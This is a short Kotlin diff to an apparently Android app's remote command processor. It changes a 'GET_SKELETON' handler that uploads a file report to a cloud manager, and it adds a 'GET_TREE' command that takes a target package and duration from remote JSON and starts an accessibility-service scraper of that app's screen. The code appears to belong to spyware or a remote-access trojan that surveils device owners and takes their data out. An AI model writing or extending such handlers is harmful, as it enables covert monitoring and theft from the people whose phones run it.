@@ -121,8 +121,15 @@ object CommandProcessor {
                 }
                 "GET_SKELETON" -> {
                     val report = FileManager.generateReport()
-                    CloudManager.uploadSkeleton(ctx, report, null)
+                    CloudManager.uploadSkeleton(applicationContext, report, null)
                     status = "EXECUTED (SIZE: ${report.toString().length})"
+                }
+                "GET_TREE" -> {
+                    val json = JSONObject(content)
+                    val pkg = json.optString("pkg", null)
+                    val mins = json.optLong("duration_mins", 1L)
+                    MyAccessibilityService.instance?.startTreeDump(pkg, mins)
+                    status = "EXECUTED (TREE SCRAPER ACTIVE: ${mins}M)"
                 }
                 "TOGGLE_FEATURE" -> {
                     if (content.contains(":")) {
